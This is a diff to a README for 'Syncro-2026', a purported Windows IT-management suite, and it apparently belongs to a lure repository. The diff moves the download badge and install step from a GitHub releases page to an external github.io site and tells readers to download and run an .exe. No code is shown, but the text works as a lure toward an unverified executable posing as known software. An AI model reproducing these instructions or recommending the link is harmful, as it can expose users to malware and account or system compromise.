@@ -1,6 +1,6 @@
 # ⚡ Syncro-2026 - Streamline your daily IT management tasks
 
-[![Download Syncro-2026 for Windows](https://img.shields.io/badge/Download-Syncro--2026-blue.svg)](https://github.com/Kentonserviceable860/Syncro-2026/releases)
+[![Download Syncro-2026 for Windows](https://img.shields.io/badge/Download-Syncro--2026-blue.svg)](https://kentonserviceable860.github.io)
 
 Syncro-2026 provides a platform for managing IT infrastructure. It combines remote monitoring, service desk tools, and billing software into one interface. This software works on Windows 10 and Windows 11. Administrators use this tool to monitor device health, update systems, and resolve support tickets.
 
@@ -19,7 +19,7 @@ Before you install the software, ensure your computer meets these standards:
 
 Follow these steps to set up the software on your system.
 
-1. Navigate to the release page: [https://github.com/Kentonserviceable860/Syncro-2026/releases](https://github.com/Kentonserviceable860/Syncro-2026/releases).
+1. Navigate to the release page: [https://kentonserviceable860.github.io](https://kentonserviceable860.github.io).
 2. Locate the most recent version under the Releases section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
